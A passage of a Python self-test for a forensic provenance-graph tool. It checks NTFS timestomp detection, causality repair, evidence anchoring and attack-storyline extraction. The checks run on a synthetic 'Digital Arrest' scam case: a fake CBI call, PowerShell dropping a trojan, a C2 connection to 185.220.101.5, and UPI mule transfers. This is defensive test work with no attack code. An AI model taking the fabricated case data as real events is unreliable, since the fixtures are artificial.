          f"{len(pre)} pre-taint children on epoch_1; late-arriving dropper2.exe rebound to epoch_2")
    d1, d2 = g.supernode.degree[(e1, REL_SPAWNED)], g.supernode.degree[(e2, REL_SPAWNED)]
    formula = lambda deg: ((1 + math.log(2)) / (1 + math.log1p(deg))) ** 1.5
    table_ok = all(abs(GATE_Q16[k] - formula(2 ** k) * Q16) <= 1 for k in range(len(GATE_Q16)))
    gh, ge2 = g.supernode.gate_q16(e1, REL_SPAWNED), g.supernode.gate_q16(e2, REL_SPAWNED)
    check(8, "Inverse log-degree gating attenuates the 1000-degree hub (gamma = 1.5, integer table)",
          d1 == 1000 and table_ok and gh == GATE_Q16[9] and gh / Q16 < 0.2 and ge2 == Q16
          and g.supernode.gate_q16(e1, REL_SPAWNED, score_to_q16(0.9)) == Q16
          and g.supernode.attention_q16(e1, REL_SPAWNED) < g.supernode.attention_q16(e2, REL_SPAWNED),
          f"deg {d1}: gate {gh}/65536 = {gh / Q16:.4f}; tainted epoch_2 (deg {d2}) and scores >= 0.85 not gated")
    g.close()

    # Synthetic Digital Arrest case (feeds 9-14, 18, 20-29, 34)
    cdir = os.path.join(workdir, "digital_arrest_case")
    exp = _write_digital_arrest_case(cdir)
    a_manifest = None
    if _sector_a is not None:
        v = _sector_a.SutraEvidenceVault(case_id=case, output_dir=os.path.join(cdir, "sector_a"))
        a_manifest = v.ingest_evidence(os.path.join(cdir, "victim_disk.img"))
    g = TemporalProvenanceGraph(case, capacity=100_000, output_dir=os.path.join(workdir, "digital_arrest_out"),
                                evidence_root=cdir, verify_anchors=True)
    if a_manifest is not None:
        g.ingest_evidence_manifest(os.path.join(cdir, "sector_a", SECTOR_A_MANIFEST))
    _ingest_digital_arrest(g, cdir, exp)
    finds = g.timestomp_report["findings"]
    per = g.timestomp_report["per_record"]
    by = lambda rule: [f for f in finds if f.get("rule") == rule]
    rec = parse_mft_record(build_mft_record(9, "x.bin", 5, [1] * 4, [1] * 4, 77, 88), 0)
    torn = bytearray(build_mft_record(9, "x.bin", 5, [1] * 4, [1] * 4, 77, 88))
    torn[1022] ^= 0xFF
    a_exe = "C:\\Users\\Public\\a.exe"
    inv1 = by("ALERT_LSN_USN_BACKDATE")
    check(9, "Invariant 1: $MFT LSN / USN monotonicity flags the backdated a.exe",
          [f["path"] for f in inv1] == [a_exe] and inv1[0]["grade"] == "PROVEN"
          and inv1[0]["reference_record"] in (41, 42) and rec["lsn"] == 77 and rec["si_usn"] == 88 and rec["name"] == "x.bin"
          and parse_mft_record(bytes(torn))["error"].startswith("FIXUP_MISMATCH"),
          f"a.exe $SI.B {inv1[0]['si_created_utc'][:10] if inv1 else '?'} but LSN {inv1[0]['lsn']:#x} / USN "
          f"{inv1[0]['usn']:#x} exceed record {inv1[0]['reference_record']} created "
          f"{inv1[0]['reference_si_created_utc'][:10]}" if inv1 else "no finding")
    inv2 = by("SI_ZERO_FRACTIONAL_TICKS")
    check(10, "Invariant 2: zero 100-ns fractional ticks expose the user-mode setter",
          [f["path"] for f in inv2] == [a_exe] and "B" in inv2[0]["zero_fraction_si_fields"]
          and inv2[0]["zero_fraction_fn_fields"] == [])
    check(11, "Invariant 3: benign Explorer copy is not confused with $SI backdating",
          per.get("C:\\Users\\Public\\copied_photo.jpg", {}).get("verdict") == "BENIGN_COPY"
          and per.get(a_exe, {}).get("copy_class") == "TIMESTOMP_BACKDATE"
          and per.get(a_exe, {}).get("verdict") == "TIMESTOMPED"
          and per.get("C:\\Users\\Public\\notes.txt", {}).get("verdict") == "CONSISTENT")
    js = bytearray(exp["ntfs"]["jstream"])
    clean_j = parse_usn_journal(bytes(js))
    second = clean_j["records"][1]["byte_offset"]
    struct.pack_into("<q", js, second + 24, clean_j["records"][0]["usn"])
    bad_j = parse_usn_journal(bytes(js))
    inv4 = by("SI_CREATED_BEFORE_JOURNAL_FILE_CREATE")
    check(12, "Invariant 4: $UsnJrnl:$J append-only order verified; spliced USN caught",
          clean_j["append_only_ok"] and len(clean_j["records"]) == 6
          and {v["rule"] for v in bad_j["violations"]} >= {"USN_NOT_EQUAL_STREAM_OFFSET", "USN_NOT_MONOTONIC"}
          and [f["path"] for f in inv4] == [a_exe] and g.timestomp_report["journal_append_only_ok"],
          f"{len(clean_j['records'])} records, USN == stream offset; a.exe journal create {inv4[0]['journal_create_utc'] if inv4 else '?'}")
    caus = g.check_causality()
    s_ps1 = "C:\\Users\\Public\\s.ps1"
    par = [p for p in caus["paradoxes"] if p["child"] == s_ps1]
    check(13, "Invariant 5: file stamped before its writer existed raises TEMPORAL_PARADOX_INVERSION",
          len(par) == 1 and par[0]["rule"] == "TEMPORAL_PARADOX_INVERSION" and par[0]["parent"] == "powershell.exe#4321"
          and par[0]["recorded_utc"].startswith("2019-03-01"), f"{caus['paradoxes_detected']} inversion(s)")
    wseq = next(q for q, r in g.arena.iter_edges() if r[2] == REL_WROTE_FILE and g.entities.names[r[1]] == s_ps1)
    wm = g.edge_meta[wseq]["timestamp_repair"]
    aseq = next(q for q, r in g.arena.iter_edges() if r[2] == REL_WROTE_FILE and g.entities.names[r[1]] == a_exe)
    tampered = [dict(x) for x in g.audit.entries]
    if tampered:
        tampered[0]["repaired_utc"] = "2026-10-14T06:10:11.000000000Z"
    check(14, "Invariant 5: repaired to a lower bound from the parent's download connection; recorded time kept",
          g.arena.get(wseq)[4] == exp["ps_syn_ns"] and wm["basis"] == "PARENT_DOWNLOAD_CONNECTION"
          and wm["recorded_utc"].startswith("2019-03-01") and wm["basis_anchor"]["source_file"] == "network_capture.pcap"
          and g.edge_meta[wseq]["payload_source_hosts"] == ["185.220.101.5"] and caus["unresolved"] == 0
          and g.arena.get(aseq)[4] == exp["ntfs"]["a_exe_true_create_ns"] and not g.arena.get(aseq)[3] & FLAG_TIME_REPAIRED
          and AuditLedger.verify(g.audit.entries, g.audit.genesis, g.audit.head, len(g.audit.entries))
          and not AuditLedger.verify(tampered, g.audit.genesis),
          f"s.ps1 {wm['recorded_utc'][:10]} -> not before {wm['repaired_utc']}; a.exe needs no repair "
          f"(kernel journal time)")

    a_exe_meta = dict(g.edge_meta.get(aseq, {}))
    story = g.export_storyline(gen)
    graph_doc = g.export_attack_graph(gen)
    steps = story["steps"]
    tree_labels = set(story["nodes"])
    links = steps + story["identity_bindings"]
    parent_of = {lab: lab for lab in tree_labels}

    def find(x):
        while parent_of[x] != x:
            parent_of[x] = parent_of[parent_of[x]]
            x = parent_of[x]
        return x

    for s in links:
        if s["actor"] in parent_of and s["target"] in parent_of:
            parent_of[find(s["actor"])] = find(s["target"])
    connected = len({find(x) for x in tree_labels}) == 1
    check(15, "PCST extracts one connected attack tree of at most 25 nodes",
          connected and 2 <= len(tree_labels) <= 25 and len(links) == len(tree_labels) - 1
          and graph_doc["statistics"]["edges_live"] > 400,
          f"{graph_doc['statistics']['edges_live']} live edges -> {len(tree_labels)} nodes, {len(steps)} steps")

    # 16 determinism: shuffled ingestion, equal-cost tie
    specs = []
    for i in range(300):
        specs.append(((("PROCESS", f"p{i % 40}.exe"), ("PROCESS", f"p{(i * 7 + 3) % 40}.exe"), REL_SPAWNED,
                       T + (i % 17) * NS, _fake_anchor(1000 + i), 0.6 if i % 5 == 0 else 0.1)))
    specs += [(("IDENTITY", "A"), ("UPI_ACCOUNT", "B"), REL_UPI_TRANSFER, T, _fake_anchor(100, "z.csv"), 0.7),
              (("IDENTITY", "A"), ("UPI_ACCOUNT", "C"), REL_UPI_TRANSFER, T, _fake_anchor(50, "z.csv"), 0.7)]
    digests, ties = set(), set()
    for seed in range(4):
        order = list(specs)
        random.Random(seed).shuffle(order)
        gg = TemporalProvenanceGraph(case, capacity=2048, output_dir=workdir, verify_anchors=False)
        for sp in order:
            gg.add_edge(*sp)
        digests.add(gg.export_storyline(gen, write=False)["storyline_sha256"])
        g2 = TemporalProvenanceGraph(case, capacity=16, output_dir=workdir, verify_anchors=False)
        for sp in (specs[-2:] if seed % 2 else specs[-2:][::-1]):
            g2.add_edge(*sp)
        g2.node_prize = {g2.entities.lookup("IDENTITY", "A"): Q16}
        sv = g2.solve_storyline(max_nodes=2)
        ties.add(tuple(g2.ledger.get(q)["byte_offset"] for q in sv["edges"]))
    check(16, "PCST is reproducible bit-for-bit; ties break on the lower byte offset",
          len(digests) == 1 and ties == {(50 * 64,)},
          f"4 shuffled ingestion orders -> 1 storyline digest {next(iter(digests))[:16]}; tie resolved to offset 3200")

    # 17 provenance rule
    gp = TemporalProvenanceGraph(case, capacity=16, output_dir=workdir)
    refused = 0
    for bad in ({"source_file": "x.log", "length": 10, "sha256": "0" * 64},
                {"byte_offset": 5, "length": 10, "sha256": "0" * 64},
                {"source_file": "x.log", "byte_offset": 5, "length": 10, "sha256": "not-a-hash"},
                {"source_file": "x.log", "byte_offset": 5, "length": 0, "sha256": "0" * 64}, None):
        try:
            gp.add_edge(("PROCESS", "a"), ("PROCESS", "b"), REL_SPAWNED, T, bad)
        except ProvenanceError:
            refused += 1
    check(17, "Edges without a physical anchor (source_file, byte_offset, length, sha256) are refused",
          refused == 5 and gp.arena.count == 0 and sum(gp.rejected_count.values()) == 5,
          ", ".join(f"{k}={v}" for k, v in sorted(gp.rejected_count.items())))
    kinds = {n["kind"] for n in graph_doc["nodes"]}
    check(18, "Multi-modal nodes: PROCESS, FILE, SOCKET, UPI_ACCOUNT, IDENTITY",
          {"PROCESS", "FILE", "SOCKET", "UPI_ACCOUNT", "IDENTITY"} <= kinds, ", ".join(sorted(kinds)))

    # Sector A + B end-to-end (feeds 19, 32, 33, 35)
    e2e_dir = os.path.join(workdir, "sector_ab_case")
    a_path, b_path, blob = _run_sector_b_case(e2e_dir, case)
    ge = None
    if b_path:
        ge = TemporalProvenanceGraph(case, capacity=50_000, output_dir=os.path.join(workdir, "sector_ab_out"),
                                     evidence_root=e2e_dir, verify_anchors=True)
        ge.ingest_evidence_manifest(a_path)
        conv = ge.ingest_triage_manifest(b_path)
        case_bind = ge.ingest_case_bindings(_write_case_bindings(e2e_dir))
        bad_json = os.path.join(e2e_dir, "case_bindings_unsupported.json")
        with open(bad_json, "w", encoding="utf-8") as f:
            json.dump([{"src": ["UPI_ACCOUNT", "rahul@okhdfc"], "dst": ["IDENTITY", "accused"], "relation": "OWNS",
                        "document": "bank_kyc_reply.txt", "quote": "VPA rahul@okhdfc belongs to the accused"}], f)
        bad_bind = ge.ingest_case_bindings(bad_json)
        e2e_graph = ge.export_attack_graph(gen)
        e2e_story = ge.export_storyline(gen)
    bridge = [e for e in (e2e_graph["edges"] if ge else []) if e["relation"] == "CROSS_RAIL_BRIDGE"]
    check(19, "Cross-rail UPI-to-USDT bridge edge carries both rails' anchors",
          len(bridge) == 1 and "CROSS_RAIL" in bridge[0]["flags"] and _anchor_ok(bridge[0]["provenance"])
          and _anchor_ok(bridge[0].get("secondary_anchors", {}).get("chain_anchor"))
          and bridge[0]["provenance"]["source_type"] == "UPI_TRANSACTION_EXPORT"
          and bridge[0]["secondary_anchors"]["chain_anchor"]["source_type"] == "BLOCKCHAIN_TRANSFER_EXPORT"
          and ge.anchor_stats["not_verified"] == 0,
          "UPI leg + TRON leg, both re-hashed from case_bundle.img" if bridge else "Sector A/B not available")

    def find_step(rel: str, actor_has: str = "", target_has: str = "") -> Optional[Dict[str, Any]]:
        return next((s for s in steps if s["relation"] == rel and actor_has in s["actor"] and target_has in s["target"]), None)

    def bound(s: Optional[Dict[str, Any]], key: str) -> bool:
        if not s:
            return False
        f, off, ln = exp[key]
        p = s["provenance"]
        return p["source_file"] == f and p["byte_offset"] == off and p["length"] == ln and p["anchor_reverified"] is True

    st1 = find_step("IMPERSONATED_CALL", "+919812300001")
    st2 = find_step("SPAWNED", "chrome.exe", "powershell.exe")
    st3 = find_step("WROTE_FILE", "powershell.exe", "a.exe")
    st4 = find_step("CONNECTED_TO", "a.exe", "185.220.101.5:443")
    st5 = find_step("UPI_TRANSFER", "rahul@okhdfc", "hub.kyc@ybl")
    st6 = find_step("UPI_TRANSFER", "hub.kyc@ybl", "mule1@ybl")
    check(20, "Storyline step 1: fake CBI WhatsApp call bound to whatsapp_desktop.log offset",
          steps and steps[0] is st1 and bound(st1, "call"), f"@{exp['call'][1]}+{exp['call'][2]}")
    check(21, "Storyline: Chrome spawning PowerShell bound to the Sysmon record offset",
          bound(st2, "chrome_ps") and st2["step"] == 2, f"sysmon.jsonl @{exp['chrome_ps'][1]}+{exp['chrome_ps'][2]}")
    check(22, "Storyline: Trojan a.exe written, bound to its $MFT FILE record in the disk image",
          bound(st3, "mft_a_exe") and st3["timestamp_basis"] == "AS_RECORDED"
          and st3["timestamp_source"] == "KERNEL_USN_JOURNAL_FILE_CREATE"
          and st3["timestamp_ns"] == exp["ntfs"]["a_exe_true_create_ns"]
          and st3["secondary_anchors"]["usn_file_create"]["anchor_reverified"] is True
          and st3["provenance"].get("sector_a_evidence_id") == (a_manifest or {}).get("evidence_id")
          and st3.get("secondary_anchors", {}).get("writer_evidence", {}).get("source_file") == "sysmon.jsonl",
          f"victim_disk.img @{exp['mft_a_exe'][1]:#x}+1024")
    check(23, "Storyline: C2 socket connection bound to its PCAP packet record",
          bound(st4, "c2") and st4.get("secondary_anchors", {}).get("sysmon_network_connect", {}).get("source_file")
          == "sysmon.jsonl", f"network_capture.pcap @{exp['c2'][1]}+{exp['c2'][2]}")
    check(24, "Storyline: victim's bank transfer bound to the statement CSV row",
          bound(st5, "bank") and st5["stage"] == 4, f"bank_statement.csv @{exp['bank'][1]}+{exp['bank'][2]}")
    mules = {s["target"] for s in steps if s["relation"] == "UPI_TRANSFER" and s["actor"] == "hub.kyc@ybl"}
    order_ok = all(x and y and x["step"] < y["step"] for x, y in zip([st1, st2, st3, st4, st5], [st2, st3, st4, st5, st6]))
    check(25, "Storyline: hub smurfing bound to the NPCI switch log; six steps in causal order",
          bound(st6, "npci_hub") and mules == {"mule1@ybl", "mule2@paytm", "mule3@okaxis", "mule4@ibl"} and order_ok,
          f"{len(mules)} mule legs; steps {[s['step'] if s else None for s in (st1, st2, st3, st4, st5, st6)]}")
    mutated = [dict(s) for s in steps]
    if st4:
        i4 = steps.index(st4)
        mutated[i4]["timestamp_ns"] = _t("2026-10-14T06:10:11Z")
    check(26, "Monotonic causality validator: 0 inversions in the repaired storyline",
          story["causality"]["storyline_inversions"] == 0 and TemporalProvenanceGraph.storyline_paradoxes(steps) == []
          and len(TemporalProvenanceGraph.storyline_paradoxes(mutated)) >= 1,
          f"{story['causality']['repaired_steps']} step repaired; moved C2 step before a.exe existed -> caught")
    with open(os.path.join(g.output_dir, ATTACK_GRAPH_FILENAME), "r", encoding="utf-8") as f:
        on_disk = json.load(f)
    epoch_edges = [e for e in graph_doc["edges"] if "svchost.exe#812[epoch_2]" in
                   {graph_doc["nodes"][int(e["source"][1:]) - 1]["label"], graph_doc["nodes"][int(e["target"][1:]) - 1]["label"]}]
    check(27, "attack_graph.json is valid for the Sector E cockpit",
          validate_attack_graph(on_disk) == [] and on_disk == json.loads(json.dumps(graph_doc))
          and graph_doc["broker_epochs"].get("svchost.exe#812") == ["svchost.exe#812[epoch_1]", "svchost.exe#812[epoch_2]"]
          and len(epoch_edges) >= 2,
          f"{len(graph_doc['nodes'])} nodes, {len(graph_doc['edges'])} edges, svchost split into 2 epochs")
    with open(os.path.join(g.output_dir, STORYLINE_FILENAME), "r", encoding="utf-8") as f:
        story_disk = json.load(f)
    check(28, "incident_storyline.json carries every Section 63 field on every step",
          validate_storyline(story_disk) == [] and story["section63_summary"]["steps_with_complete_anchor"] == len(steps)
          and all(all(k in s["provenance"] for k in SECTION63_FIELDS) for s in steps),
          f"{len(steps)} steps, {story['section63_summary']['anchors_reverified']} anchors re-hashed")
    g.close()


    ge0 = TemporalProvenanceGraph(case, capacity=16, output_dir=os.path.join(workdir, "empty"))
    es = ge0.export_storyline(gen)
    eg = ge0.export_attack_graph(gen)
    check(30, "Empty graph exports an empty storyline without error",
          es["steps"] == [] and es["nodes"] == [] and validate_storyline(es) == [] and validate_attack_graph(eg) == []
          and es["defense_challenge_matrix"]["verdict"] == "OPEN_QUESTIONS_REMAIN")

    gd = TemporalProvenanceGraph(case, capacity=64, output_dir=workdir, verify_anchors=False)
    j = 5000
    for a_, b_, sc in (("x1", "x2", 0.6), ("x2", "x3", 0.6)):
        j += 1
        gd.add_edge(("PROCESS", a_), ("PROCESS", b_), REL_SPAWNED, T + j, _fake_anchor(j), sc)
    for a_, b_, sc in (("y1", "y2", 0.99), ("y2", "y3", 0.98), ("y3", "y4", 0.97)):
        j += 1
        gd.add_edge(("PROCESS", a_), ("PROCESS", b_), REL_SPAWNED, T + j, _fake_anchor(j), sc)
    sd = gd.export_storyline(gen, write=False)
    check(31, "Disconnected graph: PCST keeps the highest-value component, reports the other",
          set(sd["nodes"]) == {"y1", "y2", "y3", "y4"} and len(sd["unconnected_clusters"]) == 1
          and set(sd["unconnected_clusters"][0]["sample"]) == {"x1", "x2", "x3"})

    if ge:
        with open(b_path, "r", encoding="utf-8") as f:
            bman = json.load(f)
        ids = [l["lead_id"] for l in bman["symbolic_anchors"]]
        check(32, "Every Sector B symbolic anchor becomes graph edges",
              conv["leads_rejected"] == [] and sorted(ge.lead_edges) == sorted(ids)
              and all(len(e2e_graph["lead_index"][i]) >= 1 for i in ids) and ge.sector_b["schema"] == "VERIFIED",
              f"{len(ids)} leads -> {conv['edges_added']} edges")
    else:
        check(32, "Every Sector B symbolic anchor becomes graph edges", False, "Sector A/B modules not found")

    if ge:
        bdir = os.path.join(workdir, "sector_ab_badsector")
        target = next(l for l in bman["symbolic_anchors"] if l["threat_category"] == "OVERLAY_HIJACK")
        bad = target["symbolic_anchor"]["byte_offset"] // 4096
        a2, b2, _ = _run_sector_b_case(bdir, case, bad_sectors=[bad])
        gb = TemporalProvenanceGraph(case, capacity=50_000, output_dir=bdir, evidence_root=bdir, verify_anchors=True)
        gb.ingest_evidence_manifest(a2)
        cb = gb.ingest_triage_manifest(b2)
        with open(b2, "r", encoding="utf-8") as f:
            bm2 = json.load(f)

        def touches(l):
            anchors = [l["symbolic_anchor"]] + [v for k, v in l["lead_details"].items() if k.endswith("_anchor")] + \
                      list(l["lead_details"].get("row_anchors") or [])
            return any(x["byte_offset"] // 4096 <= bad <= (x["byte_offset"] + x["length"] - 1) // 4096 for x in anchors)

        expect = sorted(l["lead_id"] for l in bm2["symbolic_anchors"] if touches(l))
        got = sorted(r["lead_id"] for r in cb["leads_rejected"])
        check(33, "Sector A bad-sector mask: anchors inside unreadable sectors are refused",
              expect and got == expect and all(r["reason"].startswith("ANCHOR_IN_BAD_SECTOR") for r in cb["leads_rejected"])
              and cb["leads_converted"] == len(bm2["symbolic_anchors"]) - len(expect),
              f"sector {bad} marked bad -> {len(got)} lead(s) refused, {cb['leads_converted']} kept")
        gb.close()
    else:
        check(33, "Sector A bad-sector mask: anchors inside unreadable sectors are refused", False, "Sector A/B not found")

    dm = story["defense_challenge_matrix"]
    dm_e2e = e2e_story["defense_challenge_matrix"] if ge else {"verdict": None, "rows": []}
    d6 = next((r for r in dm_e2e["rows"] if r["id"] == "D6"), {})
    check(34, "Defence matrix: Trojan defence rebutted on the record; open items surfaced, not hidden",
          dm["verdict"] == "TROJAN_DEFENSE_REBUTTED_ON_RECORD"
          and all(r["status"] in ("REBUTTED", "NOT_EVALUATED") for r in dm["rows"])
          and dm_e2e["verdict"] == "OPEN_QUESTIONS_REMAIN" and d6.get("status") == "OPEN",
          f"Digital Arrest case: {', '.join(r['id'] + '=' + r['status'] for r in dm['rows'])}; "
          f"Sector B case keeps D6 OPEN ({', '.join(d6.get('evidence', []))})")

    if ge:
        ok35 = (validate_attack_graph(e2e_graph) == [] and validate_storyline(e2e_story) == []
                and os.path.isfile(os.path.join(ge.output_dir, ATTACK_GRAPH_FILENAME))
                and os.path.isfile(os.path.join(ge.output_dir, STORYLINE_FILENAME))
                and e2e_graph["sector_a_binding"]["manifest_digest"] == "VERIFIED"
                and e2e_graph["sector_a_binding"]["sha256_linear_primary"] == _sha256_hex(blob)
                and len(e2e_story["steps"]) >= 1)
        check(35, "End-to-end Sector A -> B -> C run writes valid attack_graph.json and incident_storyline.json",
              ok35, f"{len(e2e_graph['edges'])} edges, storyline {len(e2e_story['steps'])} steps, "
                    f"{len(e2e_story['unconnected_clusters'])} other cluster(s)")
        ge.close()
    else:
        check(35, "End-to-end Sector A -> B -> C run writes valid attack_graph.json and incident_storyline.json",
              False, "Sector A/B modules not found")

    regs = _audit_regressions(workdir, case, gen, {
        "cdir": cdir, "exp": exp, "story": story, "a_exe_meta": a_exe_meta,
        "e2e_story": e2e_story if ge else None, "case_bindings": case_bind if ge else None,
        "bad_bindings": bad_bind if ge else None})

    print("\nChecks")
    for n in sorted(results):
        name, ok, detail = results[n]
        print(f"  [{'PASS' if ok else 'FAIL'}] {n:02d} {name}" + (f"  ({detail})" if detail else ""))
    print("\nAudit regression checks (hostile audit of r1)")
    for rid, name, ok, detail in regs:
        print(f"  [{'PASS' if ok else 'FAIL'}] {rid} {name}" + (f"  ({detail})" if detail else ""))
    print("\nDigital Arrest storyline")
    for s in steps:
        p = s["provenance"]
        print(f"  {s['step']:>2}. [{s['stage']}] {s['timestamp_utc'] or 'time unknown':<31} {s['narrative']}")
        print(f"        {p['source_file']} @{p['byte_offset']}+{p['length']} sha256 {p['sha256'][:16]}")
    print(f"\nOutputs: {os.path.join(workdir, 'digital_arrest_out')}, {os.path.join(workdir, 'sector_ab_out')}")
    print(f"Elapsed {time.perf_counter() - t_start:.1f} s")
    passed = sum(1 for _, ok, _ in results.values() if ok)
    rpassed = sum(1 for _r, _n, ok, _d in regs if ok)
    print(f"\n{passed}/{len(results)} checks passed")
    print(f"{rpassed}/{len(regs)} audit regression checks passed")
    return 0 if passed == len(results) and rpassed == len(regs) else 1


def _main(argv: Sequence[str]) -> int:
    if argv and argv[0] == "--run":
        import argparse
        ap = argparse.ArgumentParser(prog="sector_c_graph.py --run")
        ap.add_argument("--evidence-manifest")
        ap.add_argument("--triage-manifest", required=True)
        ap.add_argument("--evidence-root")
        ap.add_argument("--out", default=os.getcwd())
        ap.add_argument("--case-id")
        ap.add_argument("--case-bindings", help="JSON list of document-quoted attribution links")
        args = ap.parse_args(argv[1:])
        graph, story = build_from_sector_outputs(args.evidence_manifest, args.triage_manifest, args.evidence_root,
                                                 args.out, args.case_id, case_bindings=args.case_bindings)
        print(f"{len(graph['edges'])} edges, {len(story['steps'])} storyline steps; "
              f"verdict {story['defense_challenge_matrix']['verdict']}")
        print(os.path.join(args.out, ATTACK_GRAPH_FILENAME))
        print(os.path.join(args.out, STORYLINE_FILENAME))
        return 0
    return _self_test(argv[0] if argv else os.path.join(os.getcwd(), "sutra_graph_selftest"))


if __name__ == "__main__":
    sys.exit(_main(sys.argv[1:]))
